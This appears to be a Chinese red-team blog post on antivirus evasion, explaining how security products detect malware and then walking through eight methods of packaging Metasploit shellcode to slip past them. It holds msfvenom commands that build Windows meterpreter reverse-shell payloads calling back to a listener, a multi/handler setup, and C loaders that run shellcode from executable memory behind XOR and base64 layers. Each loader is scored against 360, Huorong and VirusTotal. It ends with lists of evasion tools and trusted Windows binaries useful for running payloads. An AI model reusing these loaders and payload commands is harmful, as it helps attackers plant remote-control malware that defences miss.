msf直接生成exe（VT免杀率51/69）\n\n这是最简单的一种加载shellcode的方法，直接使用msfvenom生成c语言的shellcode，为了提高免杀效果，使用了`shikata_ga_nai`编码器。\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\\x00' lhost=192.168.174.128 lport=6666  -f exe -o shellcode1.exe\n```\n\n![image-20220530115440059](./images/202205301154200.png)\n\n在msf中进行监听：\n\n```\nmsf6 > use multi/handler\nmsf6 > set payload windows/meterpreter/reverse_tcp\nmsf6 > set LHOST 192.168.174.128\nmsf6 > set LPORT 6666\nmsf6 > set EnableStageEncoding true\n```\n\n然后执行生成的`shellcode1.exe`，msf中可正常上线：\n\n![image-20220530115427316](./images/202205301154538.png)\n\n360和火绒均可查杀，在virustotal.com上查杀率为51/69。\n\n360：\n\n![image-20220530115531047](./images/202205301155110.png)\n\n火绒：\n\n![image-20220530115635342](./images/202205301156409.png)\n\nVT：\n\n![image-20220530115749310](./images/202205301157438.png)\n\n### 方法2 申请动态内存加载（VT免杀率36/69）\n\n下面的代码会申请一段动态内存，然后加载shellcode。\n\n```c\n#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") //windows控制台程序不出黑窗口\n\nunsigned char shellcode[] =\n\"shellcode\";\n\n\nvoid main()\n\n{\n\t// 原po此处内存报错，已修改\n    LPVOID Memory;\n\n    Memory=VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n    memcpy(Memory, shellcode, sizeof(shellcode));\n\n    ((void(*)())Memory)();\n\n}\n```\n\nvisual studio 2019进行编译，关闭杀软，msf中可正常上线：\n\n![image-20220530134959565](./images/202205301349630.png)\n\n打开杀软，360和火绒均可查杀（原po火绒静态和动态都可查杀，360杀毒和卫士没有反应）。\n\nvirustotal.com上查杀率为36/69（原po为24/71）。\n\n受控机没有C环境，执行时缺少`VCRUNTIME140D.dll`和`ucrtbased.dll`，需要手动安装。\n\n![image-20220530135423356](./images/202205301354403.png)\n\n360：\n\n![image-20220530135541816](./images/202205301355884.png)\n\n火绒：\n\n![image-20220530135217482](./images/202205301352552.png)\n\nVT：\n\n![image-20220530140029621](./images/202205301400718.png)\n\n### 方法3 嵌入汇编加载（VT免杀率36/69）\n\n```c\n#include <windows.h>\n#include <stdio.h>\n#pragma comment(linker, \"/section:.data,RWE\")\nunsigned char shellcode[] =\"\";\n\nvoid main()\n{\n\n        __asm\n    {\n\n        mov eax, offset shellcode\n        jmp eax\n\n    }\n}\n```\n\n在vs2019中编译执行，关闭杀软，msf中可正常上线。\n\n打开杀软，火绒和360均可查杀（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。\n\nvirustotal.com上查杀率为36/69（原po为12/71）。\n\n360：\n\n![image-20220530141332388](./images/202205301413445.png)\n\n火绒：\n\n![image-20220530141410368](./images/202205301414456.png)\n\nVT：\n\n![image-20220530141716720](./images/202205301417844.png)\n\n### 方法4 强制类型转换（VT免杀率34/68）\n\n```\n#include <windows.h>\n#include <stdio.h>\n\nunsigned char shellcode[] =\"\";\n\nvoid main()\n{\n   ((void(WINAPI*)(void))&shellcode)();\n}\n```\n\n打开杀软测试，360和火绒均可查杀，但360是在上线后几分钟后才检测出来的（原po静态+动态都没问题，可正常上线）。\n\nvirustotal.com上查杀率为34/68（原po为9/70）。\n\n![image-20220530142524357](./images/202205301425472.png)\n\n### 方法5 汇编花指令(VT免杀率37/69)\n\n```c\n#include <windows.h>\n#include <stdio.h>\n#pragma comment(linker, \"/section:.data,RWE\")\nunsigned char shellcode[] =\"\";\n\nvoid main()\n{\n    __asm\n    {\n\n        mov eax, offset shellcode\n        _emit 0xFF  \n        _emit 0xE0\n\n    }\n}\n```\n\n打开杀软，火绒可查杀，**360不可查杀**（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。\n\nvirustotal.com上查杀率为37/69（原po为12/69）。\n\n![image-20220530143025208](./images/202205301430315.png)\n\n### 方法6 xor加密（VT免杀率21/69）\n\n需要使用一个工具`https://github.com/Arno0x/ShellcodeWrapper`，原项目为python2，在此基础上修改了一个python3版本[ShellcodeWrapper](https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper)。\n\n先用msfvenom生成一个raw格式的shellcode\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\\x00' lhost=192.168.174.128 lport=6666  -f raw > shellcode.raw\n```\n\n在`ShellcodeWrapper`文件夹中执行下面命令，其中`threekiii`为自己设置的key。\n\n```\npython shellcode_encoder.py -cpp -cs -py shellcode.raw threekiii xor\n```\n\n生成了三个文件，一个为C++源码，也是下面要用到的，一个为C#源码，可以使用csc.exe进行加载，还有一个py文件，可直接执行也可以编译成py-exe执行。\n\n![image-20220530145037208](./images/202205301450337.png)\n\n其中`encryptedShellcodeWrapper_xor.cpp`文件中的C++源码如下，稍作修改，删除依赖库：\n\n```c\n/*\nAuthor: Arno0x0x, Twitter: @Arno0x0x\n*/\n\n// 删除#include \"stdafx.h\"\n#include <windows.h>\n#include <iostream>\n\nint main(int argc, char **argv) {\n\n    // Encrypted shellcode and cipher key obtained from shellcode_encoder.py\n    char encryptedShellcode[] = \"\";\n    char key[] = \"tidesec\";\n    char cipherType[] = \"xor\";\n\n    // Char array to host the deciphered shellcode\n    char shellcode[sizeof encryptedShellcode];\n\n\n    // XOR decoding stub using the key defined above must be the same as the encoding key\n    int j = 0;\n    for (int i = 0; i < sizeof encryptedShellcode; i++) {\n        if (j == sizeof key - 1) j = 0;\n\n        shellcode[i] = encryptedShellcode[i] ^ key[j];\n        j++;\n    }\n\n    // Allocating memory with EXECUTE writes\n    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n    // Copying deciphered shellcode into memory as a function\n    memcpy(exec, shellcode, sizeof shellcode);\n\n    // Call the shellcode\n    ((void(*)())exec)();\n}\n```\n\nvs2019编译执行，关闭杀软，msf中可正常上线：\n\n![image-20220530145307544](./images/202205301453694.png)\n\n打开杀软，360和火绒均可查杀，其中360结果为“具有木马特征程序”（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。\n\nvirustotal.com上查杀率为21/69（原po为15/71）。\n\n360：\n\n![image-20220530145415574](./images/202205301454631.png)\n\nVT：\n\n![image-20220530145657512](./images/202205301456618.png)\n\n### 方法7 base64加密1（VT免杀率21/68）\n\n需要两个文件，`base64.c`和`base64.h`\n\n`base64.c`文件内容：\n\n```c\n/* Base64 encoder/decoder. Originally Apache file ap_base64.c\n*/\n\n#include <string.h>\n\n#include \"base64.h\"\n\n/* aaaack but it's fast and const should make it shared text page. */\nstatic const unsigned char pr2six[256] =\n{\n    /* ASCII table */\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,\n    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,\n    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,\n    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,\n    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,\n    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64\n};\n\nint Base64decode_len(const char *bufcoded)\n{\n    int nbytesdecoded;\n    register const unsigned char *bufin;\n    register int nprbytes;\n\n    bufin = (const unsigned char *)bufcoded;\n    while (pr2six[*(bufin++)] <= 63);\n\n    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;\n    nbytesdecoded = ((nprbytes + 3) / 4) * 3;\n\n    return nbytesdecoded + 1;\n}\n\nint Base64decode(char *bufplain, const char *bufcoded)\n{\n    int nbytesdecoded;\n    register const unsigned char *bufin;\n    register unsigned char *bufout;\n    register int nprbytes;\n\n    bufin = (const unsigned char *)bufcoded;\n    while (pr2six[*(bufin++)] <= 63);\n    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;\n    nbytesdecoded = ((nprbytes + 3) / 4) * 3;\n\n    bufout = (unsigned char *)bufplain;\n    bufin = (const unsigned char *)bufcoded;\n\n    while (nprbytes > 4) {\n        *(bufout++) =\n            (unsigned char)(pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);\n        bufin += 4;\n        nprbytes -= 4;\n    }\n\n    /* Note: (nprbytes == 1) would be an error, so just ingore that case */\n    if (nprbytes > 1) {\n        *(bufout++) =\n            (unsigned char)(pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);\n    }\n    if (nprbytes > 2) {\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);\n    }\n    if (nprbytes > 3) {\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);\n    }\n\n    *(bufout++) = '\\0';\n    nbytesdecoded -= (4 - nprbytes) & 3;\n    return nbytesdecoded;\n}\n\nstatic const char basis_64[] =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\nint Base64encode_len(int len)\n{\n    return ((len + 2) / 3 * 4) + 1;\n}\n\nint Base64encode(char *encoded, const char *string, int len)\n{\n    int i;\n    char *p;\n\n    p = encoded;\n    for (i = 0; i < len - 2; i += 3) {\n        *p++ = basis_64[(string[i] >> 2) & 0x3F];\n        *p++ = basis_64[((string[i] & 0x3) << 4) |\n            ((int)(string[i + 1] & 0xF0) >> 4)];\n        *p++ = basis_64[((string[i + 1] & 0xF) << 2) |\n            ((int)(string[i + 2] & 0xC0) >> 6)];\n        *p++ = basis_64[string[i + 2] & 0x3F];\n    }\n    if (i < len) {\n        *p++ = basis_64[(string[i] >> 2) & 0x3F];\n        if (i == (len - 1)) {\n            *p++ = basis_64[((string[i] & 0x3) << 4)];\n            //    *p++ = '=';\n        }\n        else {\n            *p++ = basis_64[((string[i] & 0x3) << 4) |\n                ((int)(string[i + 1] & 0xF0) >> 4)];\n            *p++ = basis_64[((string[i + 1] & 0xF) << 2)];\n        }\n        //*p++ = '=';\n    }\n\n    *p++ = '\\0';\n    return p - encoded;\n}\n```\n\n`base64.h`文件内容：\n\n```c\n#ifndef _BASE64_H_\n#define _BASE64_H_\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n    int Base64encode_len(int len);\n    int Base64encode(char * coded_dst, const char *plain_src, int len_plain_src);\n\n    int Base64decode_len(const char * coded_src);\n    int Base64decode(char * plain_dst, const char *coded_src);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif //_BASE64_H_\n```\n\n`shellcode.c`文件内容：\n\n```c\n#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n\n#include \"base64.h\"\n\nunsigned char buf[] =\n\"msf base64 code here\";\n\n// 原po代码报错，这里做了一些强制转换和类型修正\nint main(int argc, const char* argv[]) {\n\n\n    char str1[1000] = { 0 };\n    Base64decode(str1, (char*)buf);\n    LPVOID Memory;\n    Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    memcpy(Memory, str1, sizeof(str1));\n    ((void(*)())Memory)();\n    return 0;\n}\n```\n\n使用msf生成base64编码的shellcode：\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c > shell.c\n```\n\n把`shell.c`的内容复制到上面`shellcode.c`文件中。vs2019编译，关闭杀软，msf可成功上线。\n\n打开杀软，火绒可以查杀，**360不能查杀**（原po火绒静态查杀会报毒，但行为检测没有反应，360全通过）。\n\nvirustotal.com查杀率为21/68（原po为28/69）。\n\n![image-20220530152630449](./images/202205301526558.png)\n\n### 方法8 base64加密2（VT免杀率17/67）\n\n另外一种base64加密方式，和方法7类似，实现代码略有不同。\n\n`base64.c`文件内容：\n\n```c\n//\n//  base64.c\n//  base64\n//\n//  Created by guofu on 2017/5/25.\n//  Copyright © 2017年 guofu. All rights reserved.\n//\n/**\n*  转解码过程\n*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24\n*  先将要编码的转成对应的ASCII值\n*  如编码: s 1 3\n*  对应ASCII值为: 115 49 51\n*  对应二进制为: 01110011 00110001 00110011\n*  将其6个分组分4组: 011100 110011 000100 110011\n*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:\n*  00011100 00110011 00000100 00110011对应:28 51 4 51\n*  查找base64 转换表 对应 c z E z\n*\n*  解码\n*  c z E z\n*  对应ASCII值为 99 122 69 122\n*  对应表base64_suffix_map的值为 28 51 4 51\n*  对应二进制值为 00011100 00110011 00000100 00110011\n*  依次去除每组的前两位, 再拼接成3字节\n*  即: 01110011 00110001 00110011\n*  对应的就是s 1 3\n*/\n\n#include \"base64.h\"\n\n#include <stdio.h>\n#include <stdlib.h>\n\n// base64 转换表, 共64个\nstatic const char base64_alphabet[] = {\n    'A', 'B', 'C', 'D', 'E', 'F', 'G',\n    'H', 'I', 'J', 'K', 'L', 'M', 'N',\n    'O', 'P', 'Q', 'R', 'S', 'T',\n    'U', 'V', 'W', 'X', 'Y', 'Z',\n    'a', 'b', 'c', 'd', 'e', 'f', 'g',\n    'h', 'i', 'j', 'k', 'l', 'm', 'n',\n    'o', 'p', 'q', 'r', 's', 't',\n    'u', 'v', 'w', 'x', 'y', 'z',\n    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n    '+', '/' };\n\n// 解码时使用\nstatic const unsigned char base64_suffix_map[256] = {\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,\n    255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255,  62, 255, 255, 255,  63,\n    52,  53,  54,  55,  56,  57,  58,  59,  60,  61, 255, 255,\n    255, 254, 255, 255, 255,   0,   1,   2,   3,   4,   5,   6,\n    7,   8,   9,  10,  11,  12,  13,  14,  15,  16,  17,  18,\n    19,  20,  21,  22,  23,  24,  25, 255, 255, 255, 255, 255,\n    255,  26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,\n    37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,\n    49,  50,  51, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255 };\n\nstatic char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) {\n    src <<= lnum; // src = src << lnum;\n    src >>= rnum; // src = src >> rnum;\n    return src;\n}\n\nint base64_encode(const char *indata, int inlen, char *outdata, int *outlen) {\n\n    int ret = 0; // return value\n    if (indata == NULL || inlen == 0) {\n        return ret = -1;\n    }\n\n    int in_len = 0; // 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数\n    int pad_num = 0; // 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )\n    if (inlen % 3 != 0) {\n        pad_num = 3 - inlen % 3;\n    }\n    in_len = inlen + pad_num; // 拼接后的长度, 实际编码需要的长度(3的倍数)\n\n    int out_len = in_len * 8 / 6; // 编码后的长度\n\n    char *p = outdata; // 定义指针指向传出data的首地址\n\n                       //编码, 长度为调整后的长度, 3字节一组\n    for (int i = 0; i < in_len; i += 3) {\n        int value = *indata >> 2; // 将indata第一个字符向右移动2bit(丢弃2bit)\n        char c = base64_alphabet[value]; // 对应base64转换表的字符\n        *p = c; // 将对应字符(编码后字符)赋值给outdata第一字节\n\n                //处理最后一组(最后3字节)的数据\n        if (i == inlen + pad_num - 3 && pad_num != 0) {\n            if (pad_num == 1) {\n                *(p + 1) = base64_alphabet[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))];\n                *(p + 2) = base64_alphabet[(int)cmove_bits(*(indata + 1), 4, 2)];\n                *(p + 3) = '=';\n            }\n            else if (pad_num == 2) { // 编码后的数据要补两个 '='\n                *(p + 1) = base64_alphabet[(int)cmove_bits(*indata, 6, 2)];\n                *(p + 2) = '=';\n                *(p + 3) = '=';\n            }\n        }\n        else { // 处理正常的3字节的数据\n            *(p + 1) = base64_alphabet[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)];\n            *(p + 2) = base64_alphabet[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)];\n            *(p + 3) = base64_alphabet[*(indata + 2) & 0x3f];\n        }\n\n        p += 4;\n        indata += 3;\n    }\n\n    if (outlen != NULL) {\n        *outlen = out_len;\n    }\n\n    return ret;\n}\n\n\nint base64_decode(const char *indata, int inlen, char *outdata) {\n\n    int ret = 0;\n    if (indata == NULL || inlen <= 0 || outdata == NULL ) {\n        return ret = -1;\n    }\n    if (inlen % 4 != 0) { // 需要解码的数据不是4字节倍数\n        return ret = -2;\n    }\n\n    int t = 0, x = 0, y = 0, i = 0;\n    unsigned char c = 0;\n    int g = 3;\n\n    while (indata[x] != 0) {\n        // 需要解码的数据对应的ASCII值对应base64_suffix_map的值\n        c = base64_suffix_map[indata[x++]];\n        if (c == 255) return -1;// 对应的值不在转码表中\n        if (c == 253) continue;// 对应的值是换行或者回车\n        if (c == 254) { c = 0; g--; }// 对应的值是'='\n        t = (t << 6) | c; // 将其依次放入一个int型中占3字节\n        if (++y == 4) {\n            outdata[i++] = (unsigned char)((t >> 16) & 0xff);\n            if (g > 1) outdata[i++] = (unsigned char)((t >> 8) & 0xff);\n            if (g > 2) outdata[i++] = (unsigned char)(t & 0xff);\n            y = t = 0;\n        }\n    }\n\n    return ret;\n}\n```\n\n`base64.h`文件内容：\n\n```c\n#ifndef base64_h\n#define base64_h\n\n#include <stdio.h>\n\n#if __cplusplus\nextern \"C\" {\n#endif\n\n    int base64_encode(const char *indata, int inlen, char *outdata, int *outlen);\n    int base64_decode(const char *indata, int inlen, char *outdata);\n\n#if __cplusplus\n}\n#endif\n\n#endif /* base64_h */\n```\n\n`shellcode.c`文件内容：\n\n```c\n#include <stdio.h>\n#include <string.h>\n#include <Windows.h>\n\n#include \"base64.h\"\n\nunsigned char buf[] =\n\"msf base64 code\";\n\nint main(int argc, const char * argv[]) {\n\n\n    char str3[1000] = { 0 };\n\n    // 原po代码报错，这里做了一些强制转换和类型修正\n    base64_decode(buf, (int)strlen(buf), str3);\n\n    char *Memory;\n\n    Memory = VirtualAlloc(NULL, sizeof(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n    memcpy(Memory, str3, sizeof(str3));\n\n    ((void(*)())Memory)();\n\n    return 0;\n}\n```\n\n使用msf生成base64编码的shellcode：\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c > shell.c\n```\n\n把`shell.c`的内容复制到上面`shellcode.c`文件中。vs2019编译，关闭杀软，msf可成功上线。\n\n打开杀软，火绒可以查杀，**360不能查杀**。\n\nvirustotal.com上查杀率为17/67（原po为28/69）。\n\n![image-20220530155809229](./images/202205301558330.png)\n\n## 总结\n\n与2020年相比，2022年卷了很多。纵览360和火绒就能直观感受到，确实杀软能力越来越强了。2020年可以Bypass卡巴斯基、McAfee、Symantec等杀软的方法，2022年均失效。\n\n免杀操作层出不穷，特别是近两年也有很多新的优秀项目。本文仅为最基本的免杀方式，前路漫漫，还有很多要学习的，共勉。\n\n一些知识点：\n\n- 常见免杀工具（21种）：msf自免杀、Veil、Venom、Shellter、BackDoor-Factory、Avet、TheFatRat、Avoidz、Green-Hat-Suite、zirikatu、AVIator、DKMC、Unicorn、Python-Rootkit、DKMC、Unicorn、Python-Rootkit、ASWCrypter、nps_payload、GreatSCT、HERCULES、SpookFlare、SharpShooter、CACTUSTORCH、Winpayload等。\n- 常见免杀编程语言：C/C++、C#、python、powershell、ruby、go等。\n- 常见免杀白名单程序（113个）：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等。\n\n## 参考链接\n\n- BypassAntiVirus：远控免杀系列文章 https://github.com/TideSec/BypassAntiVirus\n- AntivirusScanner：杀软进程检测脚本 https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner\n</style>\n","source":"_posts/内网渗透-免杀.md","raw":"---\ntitle: 内网渗透-免杀\ncover: https://img1.baidu.com/it/u=877727430,37580436&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=667\nswiper_index: 10\ntop_group_index: 10\nbackground: '#fff'\ndate: 2025-03-20 10:41:30\nupdated:\ntags: 攻防知识\ncategories:\nkeywords:\ndescription:\ntop:\ntop_img:\ncomments:\ntoc:\ntoc_number:\ntoc_style_simple:\ncopyright:\ncopyright_author: 转载\ncopyright_author_href:\ncopyright_url:\ncopyright_info:\nmathjax:\nkatex:\naplayer:\nhighlight_shrink:\naside:\nai:\n---\n# 内网渗透-免杀\n\n## 杀软原理\n\n可执行文件存在的两种状态及检测方式：\n\n- 未执行时在硬盘上的状态（静态检测）\n- 执行后加载进内存的状态（动态监测）\n\n杀软的基本等级：\n\n- 无害：无任何可疑行为，无任何特征命中病毒特征\n- 可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等\n- 有害：特征命中病毒特征\n\n### 静态检测\n\n静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。\n\n静态检测针对样本文件在硬盘上的状态进行检测：\n\n- 样本Hash检测：此类检测会对文件整体以及各个节段进行Hash计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于Hash检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的Hash。\n- 特征码检测：由于样本Hash检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。\n- 黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。\n\n通常静态检测会识别代码中存在的函数：\n\n- Windows API函数：尤其是与内存、堆、线程相关的函数，例如virualalloc、rtlmovememory、ntcreatthread等。\n- 编程语言关键词：cmd等关键词，例如Python中的subprocess.popen(\"cmd /c\")\n\n常见的绕过思路：\n\n- 绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加/替换资源、加密Shellcode等\n\n常用的静态检测平台：\n\n- https://www.virustotal.com/，注意：Virustotal是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查MD5是否为恶意文件。\n\n### 动态检测\n\n动态检测针对样本文件内存中的状态进行检测：\n\n- 内存特征码检测：对于静态文件特征码来说，可以将shellcode做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。\n- 敏感API检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。\n- 敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个API是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为：\n  - 注册表操作：添加启动项、添加服务。\n  - 文件操作：写入文件、读取系统文件、删除文件、移动文件。\n  - 进程操作：杀死进程、创建进程。\n  - 用户操作：添加用户、删除用户、删除用户。\n  - 其他操作：注入、劫持等。\n\n常见的绕过思路：\n\n- 绕过动态检测的方式通常是白名单调用敏感行为，再导入恶意内容\n\n常用的动态检测平台：\n\n- https://s.threatbook.cn/\n\n### 流量检测\n\n流量检测针对恶意程序在网络通讯流量层面上的状态进行检测：\n\n- 结构特征：此类特征一般是指已知远控的恶意程序心跳包，比如CS beacon心跳包特征，会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活。\n- 内容特征：此类特征一般是指各类漏洞的exp流量包特征、冰蝎、哥斯拉等流量特征，对于此类流量可以编写流量规则进行过滤检测，比如suricata规则、wireshark规则等。\n- IP/域名/证书匹配：对于数据包中的ip域名等信息，链接威胁情报平台查询是否存在恶意行为，比如扫描、用作C2回连或网站挂马等，对于此类流量可以选择弹窗告警或直接阻断。\n\n常见的绕过思路：\n\n- 绕过流量检测的方式通常有TCP分段传输、内容加密、使用合法证书等\n\n### 云查杀\n\n云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，只要联网，病毒库就会同步更新，病毒库更加强大。\n\n当开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了。\n\n## 免杀原理\n\n### 静态免杀\n\n#### 修改特征码\n\n特征码是能够识别一个程序的不大于64字节的字符。\n\n修改特征码是在不改变程序运行效果的前提下，更改其特征码。\n\n修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。\n\n#### 花指令免杀\n\n花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。\n\n为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，也就无法正常检测木马了。\n\n#### 加壳免杀\n\n软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。\n\n加壳能够掩盖特征码，特别是对于不开源的PE文件，加壳可以绕过很多特征码识别。但是壳也有自己的特征，主流的壳例如VMP、Themida等，被检测出将直接报毒。\n\n可以用一些冷门的加密壳，或基于开源压缩壳做二次开发。\n\n加壳工具：\n\n- ASPack\n- UPX\n\n### 动态免杀\n\n#### API免杀\n\n- 替换API：杀软不可能拦截所有API，可以使用相同功能的API进行替换，例如`MoveFileEx`替换`MoveFile`。\n\n- 重写API：逆向后完全重写系统API功能，实现对应功能的API。\n\n- 底层API：寻找更底层的API进行调用，绕过拦截，例如NT函数。或者通过DeviceloControl函数调用驱动功能来完成API功能，模拟系统调用。\n\n#### 内存免杀\n\n在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。加壳时，需要加一个混淆程序原有代码的壳，才能躲过杀软查杀。\n\n#### 